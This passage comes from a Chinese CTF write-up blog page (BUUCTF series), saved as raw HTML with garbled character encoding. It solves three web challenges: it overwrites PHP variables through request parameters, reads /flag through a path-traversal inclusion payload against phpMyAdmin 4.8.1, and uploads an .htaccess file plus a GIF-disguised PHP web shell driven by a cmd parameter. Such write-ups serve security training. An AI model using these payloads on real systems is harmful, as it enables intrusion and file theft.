class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure>
<p>å¯ç”¨çœ‹åˆ°å¼€å¤´å°±æœ‰ä¸¤ä¸ªå˜é‡æ³¨å†Œï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¼šæŠŠ<code>$_GET</code>å’Œ<code>$_POST</code>çš„é”®åä½œä¸ºå˜é‡åï¼Œå€¼ä½œä¸ºå˜é‡å€¼ï¼Œæ¥ç»„æˆæ–°çš„å˜é‡ã€‚</p>
<p>æ¥ç€æœ‰ä¸‰æ®µè¿ç»­çš„æ­»äº¡exitï¼Œæˆ‘ä»¬ä¸èƒ½è®©æˆ‘ä»¬çš„payloadæ‰§è¡Œåˆ°é‚£é‡Œã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ‰¹é‡åˆ¤æ–­$_GETä¸­æ˜¯å¦å­˜åœ¨é”®åä¸$_GET['flag']çš„å€¼ç›¸åŒçš„å…¶ä»–é”®</span></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åˆ¤æ–­$_GET['flag']ä¸$_POST['flag']æ˜¯å¦å­˜åœ¨</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åˆ¤æ–­$_POST['flag']æˆ–$_GET['flag']æ˜¯å¦ä¸ºflag</span></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ¬é¢˜çš„å…³é”®æ˜¯éœ€è¦æ»¡è¶³<code>isset($_GET[&#39;flag&#39;]) || isset($_POST[&#39;flag&#39;]</code>çš„åŒæ—¶ï¼Œè¿˜éœ€æ»¡è¶³<code>$_POST[&#39;flag&#39;] !== &#39;flag&#39;  &amp;&amp; $_GET[&#39;flag&#39;] !== &#39;flag&#39;</code>ã€‚</p>
<h3 id="æ³•ä¸€"><a href="#æ³•ä¸€" class="headerlink" title="æ³•ä¸€"></a>æ³•ä¸€</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡GETæ–¹å¼ä¼ é€’å‚æ•°yds=flagï¼Œä½¿å¾—<code>$yds=$flag</code>ï¼Œæœ€ç»ˆæ‰§è¡Œåˆ°ä¸Šè¿°ä»£ç æ—¶å¸¦å‡ºflagçš„å€¼ã€‚</p>
<h3 id="æ³•äºŒ"><a href="#æ³•äºŒ" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?_POST&#x3D;_GET&amp;_GET&#x3D;_COOKIE HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxx.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.89 Safari&#x2F;537.36</span><br><span class="line">Cookie: flag&#x3D;1</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡è¦†ç›–<code>$_POST</code>ä¸<code>$_GET</code>ç»•æ¥ä¸¤ä¸ªæ­»äº¡exitï¼Œé€šè¿‡æœ€ç»ˆçš„è¾“å‡ºé‚£é“flagã€‚</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917162459730.png" alt="image-20200917162459730.png"></p>
<h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p>ä»é¢˜ç›®çŒœå‡ºåº”è¯¥æ˜¯ä¸æ•°æ®åº“æœ‰å…³çš„é¢˜ç›®ï¼Œé€šè¿‡æ‰«æå·¥å…·æ‰«æå¾—å‡ºï¼š<code>phpinfo.php</code>ä¸phpmyadminç›®å½•ã€‚</p>
<p>è®¿é—®phpmyadminï¼Œè®¿é—®ç›´æ¥å·²ç»ç™»å½•å¥½äº†ã€‚åœ¨é¦–é¡µå¤„å¾—åˆ°phpmyadminç‰ˆæœ¬ï¼š4.8.1ã€‚</p>
<p>é€šè¿‡phpinfoå¯ä»¥å¾—åˆ°ç½‘ç«™è¿è¡Œç›®å½•ï¼š/var/www/html</p>
<p>å°è¯•ç›´æ¥å†™å‡ºæ–‡ä»¶ï¼ŒæŸ¥çœ‹secure_file_privæƒé™ï¼Œå¦‚æœä¸ºâ€™â€™åˆ™å¯ä»¥å†™å…¥æ–‡ä»¶ï¼Œä¸ºNULLåˆ™æ— æƒé™ã€‚</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917212432455.png" alt="image-20200917212432455"></p>
<p>å†å°è¯•ä¿®æ”¹æ—¥å¿—è·¯å¾„æ‹¿shell</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917212708785.png" alt="image-20200917212708785"></p>
<p>æŠ¥é”™ï¼Œæç¤ºæƒé™ä¸è¶³ã€‚</p>
<p>æ‰“å¼€æœç´¢å¼•æ“ï¼Œæœç´¢phpmyadmin 4.8.1ä¹‹åæ‰¾åˆ°ä¸€ä¸ªphpmyadminçš„åŒ…å«æ¼æ´ï¼Œè¯¦ç»†åˆ†æåœ°å€ï¼š<a href="https://xz.aliyun.com/t/2399" target="_blank" rel="noopener">phpmyadmin4.8.1åå°GetShell</a>ã€‚</p>
<p>ç”¨å›¾ä¸­çš„payloadç›´æ¥è¯»å–FLAGï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;phpmyadmin&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917212941931.png" alt="image-20200917212941931"></p>
<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>è¿™é¢˜å’Œä¸Šè¾¹é‚£é¢˜MRCTF2020çš„ä¸Šä¼ é¢˜æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯ä¸Šä¼ .httaccessæ–‡ä»¶åå†ä¸Šä¼ ä¸€ä¸ªjpgæ–‡ä»¶å³å¯ã€‚</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917214214206.png" alt="image-20200917214214206"></p>
<p>æ³¨æ„ï¼Œè¿™é‡Œåšäº†æ–‡ä»¶å¤´å’Œphpå†…å®¹åˆ¤æ–­ï¼Œç”¨GIF89aå’Œ<code>&lt;script language=&#39;php&#39;&gt;phpä»£ç &lt;/script&gt;</code>ã€‚</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917214314739.png" alt="image-20200917214314739"></p>
<p>è¯»å–æ ¹ç›®å½•çš„FLAGï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;upload&#x2F;0cffff4b7b760870553f87db86cc9953&#x2F;2.jpg?cmd&#x3D;highlight_file(%27&#x2F;flag%27);</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917214402402.png" alt="image-20200917214402402"></p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">Yunen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://www.0x002.com/2020/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E5%9B%9B)%E4%B9%8BBUUCTF/">https://www.0x002.com/2020/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E5%9B%9B)%E4%B9%8BBUUCTF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="https://www.0x002.com" target="_blank">Yunen's Blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2020/2020%E9%87%8D%E5%BA%86%E5%B8%82%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20-%20Web%20Writeup/"><img class="next-cover" data-src="https://img.0x002.com/article/ChongQingCTF2020/cover.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">2020é‡åº†å¸‚æ•™è‚²ç³»ç»Ÿç½‘ç»œå®‰å…¨æ”»é˜²ç«èµ›å†³èµ› - Web Writeup</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> ç›¸å…³æ¨è</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/ç™¾é“CTFåˆ·é¢˜è®°å½•(äºŒ)ä¹‹BUUCTF/" title="ç™¾é“CTFåˆ·é¢˜è®°å½•(äºŒ)ä¹‹BUUCTF"><img class="relatedPosts_cover" data-src="https://img.0x002.com/article/BuuCTF/cover.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-26</div><div class="relatedPosts_title">ç™¾é“CTFåˆ·é¢˜è®°å½•(äºŒ)ä¹‹BUUCTF</div></div></a></div><div class="relatedPosts_item"><a href="/2020/ç™¾é“CTFåˆ·é¢˜è®°å½•(ä¸‰)ä¹‹BUUCTF/" title="ç™¾é“CTFåˆ·é¢˜è®°å½•(ä¸‰)ä¹‹BUUCTF"><img class="relatedPosts_cover" data-src="https://img.0x002.com/article/BuuCTF2/cover.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-21</div><div class="relatedPosts_title">ç™¾é“CTFåˆ·é¢˜è®°å½•(ä¸‰)ä¹‹BUUCTF</div></div></a></div><div class="relatedPosts_item"><a href="/2020/CISCN 2020 Web WriteUp/" title="CISCN 2020 Web WriteUp"><img class="relatedPosts_cover" data-src="https://img.0x002.com/article/Ciscn2020/cover.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-21</div><div class="relatedPosts_title">CISCN 2020 Web WriteUp</div></div></a></div><div class="relatedPosts_item"><a href="/2019/2019å…¨å›½å¤§å­¦ç”Ÿä¿¡å®‰èµ›ä¸¤é¢˜WEBé¢˜è§£/" title="2019å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨å¤§èµ›ä¸¤é“web"><img class="relatedPosts_cover" data-src="https://img.0x002.com/article/Ciscn2019/cover.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2019-04-20</div><div class="relatedPosts_title">2019å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨å¤§èµ›ä¸¤é“web</div></div></a></div><div class="relatedPosts_item"><a href="/2018/CTFå®éªŒå§è®©æˆ‘è¿›å»writeup/" title="CTFå®éªŒå§è®©æˆ‘è¿›å»writeup"><img class="relatedPosts_cover" data-src="https://img.0x002.com/article/CTFLetmeinWriteUp/cover.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2018-09-08</div><div class="relatedPosts_title">CTFå®éªŒå§è®©æˆ‘è¿›å»writeup</div></div></a></div><div class="relatedPosts_item"><a href="/2019/ç™¾é“CTFåˆ·é¢˜è®°å½•(ä¸€)ä¹‹å®éªŒå§/" title="ç™¾é“CTFåˆ·é¢˜è®°å½•(ä¸€)ä¹‹å®éªŒå§"><img class="relatedPosts_cover" data-src="https://p.pstatp.com/origin/dc0900063a606162b25a"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2019-04-09</div><div class="relatedPosts_title">ç™¾é“CTFåˆ·é¢˜è®°å½•(ä¸€)ä¹‹å®éªŒå§</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headling"><i class="fas fa-comments fa-fw"></i><span> è¯„è®º</span></div></div><div class="comment-wrap"><div class="comments-items-1" data-name="Valine"><div class="vcomment" id="vcomment"></div><script>function loadvaline () {  
  var requestSetting = function (from,set) {
    var from = from
    var setting = set.split(',').filter(function(item){
    return from.indexOf(item) > -1
    });
    setting = setting.length == 0 ? from :setting;
    return setting
  }

  var guestInfo = requestSetting(['nick','mail','link'],'nick,mail,link')
  var requiredFields = requestSetting(['nick','mail'],'nick,mail')

  function initValine () {
    window.valine = new Valine({
      el:'#vcomment',
      appId: 'Xl1tFeGDPcFzY1gIYVQo75rr-gzGzoHsz',
      appKey: '6YTKXORDpitI5WYSHaNjY1Ho',
      placeholder: 'ç•™ä¸€ä¸ªè„šå°ï¼Œè®°å¾—ç•™ä¸‹é‚®ç®±å“Ÿ',
      avatar: 'monsterid',
      meta: guestInfo,
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: true,
      serverURLs: '',
      emojiCDN: 'https://img.0x002.com/alu/',
      emojiMaps: {"å":"å.png","å–·è¡€":"å–·è¡€.png","ç‹‚æ±—":"ç‹‚æ±—.png","ä¸è¯´è¯":"ä¸è¯´è¯.png","æ±—":"æ±—.png","åç­‰":"åç­‰.png","çŒ®èŠ±":"çŒ®èŠ±.png","ä¸é«˜å…´":"ä¸é«˜å…´.png","ä¸­åˆ€":"ä¸­åˆ€.png","å®³ç¾":"å®³ç¾.png","çš±çœ‰":"çš±çœ‰.png","å°çœ¼ç›":"å°çœ¼ç›.png","ä¸­æŒ‡":"ä¸­æŒ‡.png","å°´å°¬":"å°´å°¬.png","ç…ä½ ":"ç…ä½ .png","æƒ³ä¸€æƒ³":"æƒ³ä¸€æƒ³.png","ä¸­æª":"ä¸­æª.png","å¾—æ„":"å¾—æ„.png","è‚¿åŒ…":"è‚¿åŒ….png","æ‰‡è€³å…‰":"æ‰‡è€³å…‰.png","äº²äº²":"äº²äº².png","æƒŠå–œ":"æƒŠå–œ.png","è„¸çº¢":"è„¸çº¢.png","æ— æ‰€è°“":"æ— æ‰€è°“.png","ä¾¿ä¾¿":"ä¾¿ä¾¿.png","æ„¤æ€’":"æ„¤æ€’.png","èœ¡çƒ›":"èœ¡çƒ›.png","çŒ®é»„ç“œ":"çŒ®é»„ç“œ.png","å†…ä¼¤":"å†…ä¼¤.png","æŠ•é™":"æŠ•é™.png","è§‚å¯Ÿ":"è§‚å¯Ÿ.png","çœ‹ä¸è§":"çœ‹ä¸è§.png","å‡»æŒ":"å‡»æŒ.png","æŠ é¼»":"æŠ é¼».png","é‚ªæ¶":"é‚ªæ¶.png","çœ‹çƒ­é—¹":"çœ‹çƒ­é—¹.png","å£æ°´":"å£æ°´.png","æŠ½çƒŸ":"æŠ½çƒŸ.png","é”çœ‰":"é”çœ‰.png","è£…å¤§æ¬¾":"è£…å¤§æ¬¾.png","åèˆŒ":"åèˆŒ.png","æ— å¥ˆ":"æ— å¥ˆ.png","é•¿è‰":"é•¿è‰.png","èµä¸€ä¸ª":"èµä¸€ä¸ª.png","å‘²ç‰™":"å‘²ç‰™.png","æ— è¯­":"æ— è¯­.png","é˜´æš—":"é˜´æš—.png","ä¸å‡ºæ‰€æ–™":"ä¸å‡ºæ‰€æ–™.png","å’½æ°”":"å’½æ°”.png","æœŸå¾…":"æœŸå¾….png","é«˜å…´":"é«˜å…´.png","åè¡€å€’åœ°":"åè¡€å€’åœ°.png","å“­æ³£":"å“­æ³£.png","æ¬¢å‘¼":"æ¬¢å‘¼.png","é»‘çº¿":"é»‘çº¿.png","å–œæè€Œæ³£":"å–œæè€Œæ³£.png","å–·æ°´":"å–·æ°´.png","æ·±æ€":"æ·±æ€.png","é¼“æŒ":"é¼“æŒ.png","æš—åœ°è§‚å¯Ÿ":"æš—åœ°è§‚å¯Ÿ.png"},
      enableQQ: true,
      requiredFields: requiredFields
    });
  }
  loadScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
}

if ('Valine' === 'Valine' || false) {
  window.addEventListener('load', loadvaline)
}
else {
  function loadOtherComment () {
    loadvaline()
  }
}</script></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2017 - 2020 By Yunen</div><div class="framework-info"><span>é©±åŠ¨ </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div><div class="icp"><a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener"><img class="icp-icon" src="/img/icp.png"/><span>é²ICPå¤‡20025229å·-8</span></a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="æ”¾å¤§å­—ä½“"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="ç¼©å°å­—ä½“"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="ç®€ç¹è½¬æ¢">ç¹</button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog"></i></button><a id="to_comment" href="#post-comment" title="ç›´è¾¾è¯„è®º"><i class="fas fa-comments"></i></a><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">æœ¬åœ°æœç´¢</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>ç”±</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>æä¾›æ”¯æŒ</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><script src="/js/search/local-search.js"></script></body></html>